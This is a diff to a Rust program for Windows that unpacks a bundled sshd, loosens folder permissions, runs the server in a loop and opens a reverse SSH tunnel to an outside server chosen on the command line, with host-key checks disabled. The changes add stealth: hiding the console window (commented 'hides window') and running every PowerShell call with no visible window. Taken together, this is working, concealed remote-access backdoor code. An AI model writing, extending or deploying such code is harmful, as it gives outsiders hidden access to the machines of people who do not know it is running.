@@ -1,10 +1,15 @@
+#![windows_subsystem = "windows"] // hides window
 use std::fs;
 use clap::{Parser};
 use rand::{distributions::Alphanumeric, Rng};
 use rust_embed::RustEmbed;
 use std::path::{Path};
 use std::process::{Command,Stdio};
+use std::os::windows::process::CommandExt;
 use std::{thread, time::Duration};
+
+const CREATE_NO_WINDOW: u32 = 0x08000000;
+const DETACHED_PROCESS: u32 = 0x00000008;
 
 #[derive(RustEmbed)]
 #[folder = "files/"]
@@ -22,7 +27,6 @@ struct Cli {
     tunnel_port: u16,
     #[clap(short, long, default_value = "tunnel")]
     tunnel_user: String
-
 }
 
 fn main() {
@@ -31,6 +35,7 @@ fn main() {
     let tunnel_server = cli.tunnel_server;
     let tunnel_port =cli.tunnel_port;
     let tunnel_user = cli.tunnel_user;
+
 
     let rs: String = rand::thread_rng()
         .sample_iter(&Alphanumeric)
@@ -44,10 +49,8 @@ fn main() {
     let username_cmd_output = Command::new("powershell")
         .arg("-c")
         .arg("
-            $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent();
-            $account = $identity.User.Translate([System.Security.Principal.NTAccount]);
-            $username = $account.Value;
-            Write-Host $username;")
+            Write-Host $env:USERDOMAIN\\$env:USERNAME;")
+        .creation_flags(CREATE_NO_WINDOW)
         .output()
         .unwrap();
     let username = String::from_utf8(username_cmd_output.stdout).unwrap();
@@ -71,6 +74,7 @@ fn main() {
             Set-Acl $FilePath $acl;", pathstr);
         Command::new("powershell").arg("-c")
         .arg(cmd)
+        .creation_flags(CREATE_NO_WINDOW)
         .spawn()
         .unwrap();        
     }
@@ -102,8 +106,8 @@ fn main() {
     if tunnel_server.ne("tunnel_default") {
         // create the tunnel and remote port forward
         println!("Creating reverse port forward for port {} on server {} as user {}\n",port,tunnel_server,tunnel_user);
-        let rev = format!("Push-Location \"{}\"; ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -i \"{}\\key_reverse\" -R {}:127.0.0.1:{} -p {} {}@{} ;",tmp_as, tmp_as, port,port,tunnel_port,tunnel_user, tunnel_server );
-        Command::new("powershell").stdout(Stdio::null()).arg("-c").arg(&rev).spawn();
+        let rev = format!("Push-Location \"{}\"; ssh -N -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -i \"{}\\key_reverse\" -R {}:127.0.0.1:{} -p {} {}@{} ;",tmp_as, tmp_as, port,port,tunnel_port,tunnel_user, tunnel_server );
+        Command::new("powershell").stdout(Stdio::null()).arg("-c").arg(&rev).creation_flags(CREATE_NO_WINDOW).spawn();
     }
     // start server
     let cmd = format!("Push-Location \"{}\"; .\\sshd.exe -f \"{}\\sshd_config\" -E \"{}\\log.txt\" -d; Pop-Location", tmp_as, tmp_as, tmp_as );
@@ -112,6 +116,7 @@ fn main() {
     loop {
         Command::new("powershell").arg("-c")
             .arg(&cmd)
+            .creation_flags(CREATE_NO_WINDOW)
             .status() 
             .unwrap();   
     }
